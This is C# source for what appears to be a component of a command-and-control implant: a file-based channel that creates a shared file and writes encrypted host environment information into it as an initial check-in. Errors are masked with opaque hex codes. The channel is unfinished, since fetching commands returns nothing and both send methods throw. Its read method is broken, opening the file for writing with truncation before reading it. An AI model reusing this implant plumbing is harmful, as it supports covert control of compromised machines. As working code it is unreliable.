using System;
using System.IO;
using System.Text;
using System.Threading;

#if FCOMM
internal class FileComms : IComms
{
    private readonly Config _config;

    internal FileComms(Config config)
    {
        _config = config;
    }

    public string GetCommands()
    {
        return null;
    }

    public void SendTaskOutputString(string taskId, string data)
    {
        throw new NotImplementedException();
    }

    public void SendTaskOutputBytes(string taskId, byte[] data)
    {
        throw new NotImplementedException();
    }

    public string Stage(string environmentalInfo)
    {
        var path = Path.GetDirectoryName(_config.FCommFilePath);
        if (path == null)
        {
#if DEBUG
            Program.STDOUT.WriteLine($"[*] Could get directory name from configured path: {_config.FCommFilePath}");
#endif
            throw new Exception("0x0012");
        }

        Directory.CreateDirectory(path);
        try
        {
            using (File.Create(_config.FCommFilePath))
            {
#if DEBUG
                Program.STDOUT.WriteLine($"[*] Created FComm file: {_config.FCommFilePath}");
#endif
            }
        }
        catch (Exception e)
        {
#if DEBUG
            Program.STDOUT.WriteLine($"[*] Could get create FComm file: {_config.FCommFilePath} - {e.Message}");
#endif
            throw new Exception("0x0013");
        }

        var initialContent = new FCDataGram()
        {
            PacketType = "INIT", Input = Convert.ToBase64String(Encoding.UTF8.GetBytes("initial")),
            Output = Convert.ToBase64String(Encoding.UTF8.GetBytes(environmentalInfo)), Actioned = true
        };
        WriteToFile(initialContent.ToString());
#if DEBUG
        Program.STDOUT.WriteLine($"[*] Wrote stage to file");
#endif
        return null;
    }

    public void Dispose()
    {
        try
        {
            File.Delete(_config.FCommFilePath);
        }
        catch (Exception e)
        {
#if DEBUG
            Program.STDOUT.WriteLine($"[-] Error deleting file: {e.Message}");
#endif
        }
    }

    private void WriteToFile(string data)
    {
        var encrypted = Encryption.Encrypt(_config.Key, data);
        try
        {
            using (var fileStream = new FileStream(_config.FCommFilePath, FileMode.Create, FileAccess.Write))
            {
                using (var streamWriter = new StreamWriter(fileStream))
                {
                    streamWriter.WriteLine(encrypted);
                }
            }
        }
        catch (IOException)
        {
            Thread.Sleep(200);
        }
    }

    private string ReadFromFile()
    {
        using (var fileStream = new FileStream(_config.FCommFilePath, FileMode.Create, FileAccess.Write))
        {
            using (var streamReader = new StreamReader(fileStream))
            {
                var line = streamReader.ReadLine();
                return Encoding.UTF8.GetString(Encryption.Decrypt(_config.Key, line));
            }
        }
    }
}

internal class FCDataGram
{
    public string PacketType { get; set; }
    public string Input { get; set; }
    public string Output { get; set; }
    public bool Actioned { get; set; }
    public bool Retrieved { get; set; }

    public FCDataGram()
    {
        Actioned = false;
        Retrieved = false;
    }

    public FCDataGram(string[] objContents)
    {
        PacketType = objContents[0];
        Input = objContents[1];
        Output = objContents[2];
        Actioned = bool.Parse(objContents[3]);
        Retrieved = bool.Parse(objContents[4]);
    }

    public FCDataGram(string objContents)
    {
        char[] delim = { ',' };
        FromStringArray(objContents.Split(delim));
    }

    public override string ToString()
    {
        return string.Join(",", ToStringArray());
    }

    public string[] ToStringArray()
    {
        return new[] { PacketType, Input, Output, Actioned.ToString(), Retrieved.ToString() };
    }

    public void FromStringArray(string[] objContents)
    {
        PacketType = objContents[0];
        Input = objContents[1];
        Output = objContents[2];
        Actioned = bool.Parse(objContents[3]);
        Retrieved = bool.Parse(objContents[4]);
    }
}

#endif